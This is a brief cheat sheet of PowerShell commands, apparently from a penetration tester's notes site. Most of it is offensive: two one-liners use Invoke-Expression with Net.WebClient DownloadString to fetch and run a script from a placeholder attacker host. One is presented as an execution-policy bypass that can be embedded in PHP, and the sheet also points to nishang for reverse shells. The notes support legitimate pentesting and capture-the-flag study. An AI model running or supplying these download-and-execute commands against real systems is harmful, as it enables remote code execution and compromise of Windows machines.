# PowerShell

PowerShell.exe full path: `C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe`

Show all current environment variables in PowerShell: `dir env:` \(in CMD just type `set`\)

Get tons of computer info in PowerShell: `Get-ComputerInfo`

Fully PowerShell version of `wget`. Retrieve file and execute remote code after downloading:

```text
powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
```

Can also use `wget https://zweilosec.gitbook.io/hackers-rest -OutFile C:\Windows\Temp\out.html` to save the file to the local machine.  `wget` is an alias for `Invoke-WebRequest`. `-Outfile` is needed to save the file to disk.

PowerShell Script Execution Bypass: \[can embed in php too! TODO: write script example of this\]:

```text
echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | powershell -noprofile -
```

PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)

